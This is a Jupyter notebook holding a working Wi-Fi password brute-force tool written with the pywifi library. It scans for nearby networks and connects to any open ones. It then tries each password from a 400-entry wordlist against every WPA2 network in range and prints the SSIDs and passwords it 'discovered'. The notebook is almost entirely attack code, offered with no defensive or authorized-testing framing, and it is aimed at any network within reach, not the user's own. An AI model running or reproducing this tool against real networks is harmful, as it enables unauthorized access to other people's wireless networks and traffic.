{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "13e0626e",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "#!pip install comtypes\n",
    "#!pip install pywifi\n",
    "\n",
    "import time\n",
    "import pywifi\n",
    "from IPython.display import display, HTML\n",
    "from pywifi import const"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "74ab2ed2",
   "metadata": {},
   "outputs": [],
   "source": [
    "available_devices = []\n",
    "keys = []\n",
    "final_output = {}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7a0e65da",
   "metadata": {},
   "outputs": [],
   "source": [
    "#### Get interface information\n",
    "##### In general, there will be only one Wi-Fi interface in the platform. Thus, use index 0 to obtain the Wi-Fi interface. \n",
    "### Get the name of the Wi-Fi interface."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7a2d778",
   "metadata": {},
   "outputs": [],
   "source": [
    "wifi = pywifi.PyWiFi()\n",
    "interface = wifi.interfaces()[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b9f56d6c",
   "metadata": {},
   "outputs": [],
   "source": [
    "display(HTML('<h3>{}</h3>'.format(interface.name())))\n",
    "#print(interface.name())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4d9bbd20",
   "metadata": {},
   "outputs": [],
   "source": [
    "display(HTML(\"<h3><u> Now let's scan the network.</u></h3>\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "180d1a90",
   "metadata": {},
   "outputs": [],
   "source": [
    "interface.scan()\n",
    "#It is safer to call scan_results() 2 ~ 8 seconds later after calling scan()\n",
    "#Because the scan time can be different for each Wi-Fi interface provider. \n",
    "time.sleep(5) \n",
    "### Obtain the results of the previous triggerred scan. A Profile list will be returned.\n",
    "x = interface.scan_results()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9f7c2c19",
   "metadata": {},
   "outputs": [],
   "source": [
    "display(HTML(\"<h3><u> Let's See All Network Profiles</u></h3>\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b9e95db0",
   "metadata": {},
   "outputs": [],
   "source": [
    "available_devices = []\n",
    "for i in x:\n",
    "    available_devices.append(i.ssid)\n",
    "html = '<table style=\"font-size:1em\"><tr><th>{}</th><th style=\"text-align: Center\">{}</th>'.format('#','SSID')\n",
    "c=0\n",
    "for i in available_devices:\n",
    "    c+=1\n",
    "    html+='<tr><td>{}</td><td style=\"text-align: left\">{}</td></tr>'.format(c,i)\n",
    "html+='</table>'\n",
    "display(HTML(html))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1da6fc29",
   "metadata": {},
   "outputs": [],
   "source": [
    "display(HTML(\"<h3><u> Let's See Check for open network around us.</u></h3>\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8823be95",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in available_devices:\n",
    "    nm = i\n",
    "    try:\n",
    "        i=i.strip()\n",
    "        profile = pywifi.Profile()\n",
    "        profile.ssid = i\n",
    "        profile.auth = const.AUTH_ALG_OPEN\n",
    "        profile.akm.append(const.AKM_TYPE_NONE)\n",
    "        wifi = pywifi.PyWiFi()\n",
    "        iface = wifi.interfaces()[0]\n",
    "        iface.remove_all_network_profiles()\n",
    "        profile = iface.add_network_profile(profile)\n",
    "        iface.connect(profile)\n",
    "        time.sleep(4)\n",
    "        print(\"Trying to Connect to SSID : \",i)\n",
    "        if iface.status() == const.IFACE_CONNECTED:\n",
    "            print('success password of the network',i,' is',\"none\")\n",
    "            final_output[i] = \"\"\n",
    "            available_devices.remove(nm)\n",
    "    except Exception as e:\n",
    "        print(e)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a4d64bb0",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('top400.txt','r') as f:\n",
    "    for i in f:\n",
    "        i = i.replace('\\n','')\n",
    "        if i not in keys:\n",
    "            keys.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e0d2477",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(keys)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c54309fa",
   "metadata": {},
   "outputs": [],
   "source": [
    "try:\n",
    "    for i in available_devices:\n",
    "        profile = pywifi.Profile()\n",
    "        i=i.strip()\n",
    "        profile.ssid = i\n",
    "        profile.auth = const.AUTH_ALG_OPEN\n",
    "        profile.akm.append(const.AKM_TYPE_WPA2PSK)\n",
    "        profile.cipher = const.CIPHER_TYPE_CCMP\n",
    "        flag=0\n",
    "        for j in keys:\n",
    "            j=j.strip()\n",
    "            profile.key = j\n",
    "            wifi = pywifi.PyWiFi()\n",
    "            iface = wifi.interfaces()[0]\n",
    "            iface.remove_all_network_profiles()\n",
    "            profile = iface.add_network_profile(profile)\n",
    "\n",
    "            iface.connect(profile)\n",
    "            time.sleep(4)\n",
    "            if iface.status() == const.IFACE_CONNECTED:\n",
    "                print('success password of the network',i,' is',j)\n",
    "                final_output[i] = j\n",
    "                flag=1\n",
    "                break\n",
    "except Exception as e:\n",
    "    print(e)\n",
    "        #if flag == 0:\n",
    "        #print('sorry we are not able to CRACK PASSWORD of',i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ce080d5a",
   "metadata": {},
   "outputs": [],
   "source": [
    "print('*'*10,'Discovered Password','*'*10)\n",
    "print(\"{0:<18} {1:<12}\".format(\"HOST NAME\",\"PASSWORD\"))\n",
    "for SSID,Key in final_output.items():\n",
    "    print (\"{:<19}{:<5}\".format(SSID, Key))\n",
    "available_devices.clear()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "513fa99b",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "vscode": {
   "interpreter": {
    "hash": "b0aeeb24f5ff6ac7b92de8b7678fda2f38a13466b5fd554c935ef84cf232685d"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
